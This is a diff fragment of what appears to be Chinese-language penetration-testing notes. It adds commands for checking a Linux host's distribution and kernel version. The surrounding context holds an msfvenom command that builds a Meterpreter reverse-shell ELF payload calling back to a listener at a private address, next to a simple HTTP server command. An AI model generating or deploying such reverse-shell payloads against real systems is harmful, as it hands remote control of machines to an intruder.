@@ -50,3 +50,10 @@ python -m SimpleHTTPServer 8090
 msfvenom  -p linux/x86/meterpreter/reverse_tcp  lhost=192.168.42.128 lport=6666 -f elf -o 6666.elf
 ```
 
+查看linux系统发行版本、内核版本
+
+```
+lsb_release -a
+uname -a
+```
+
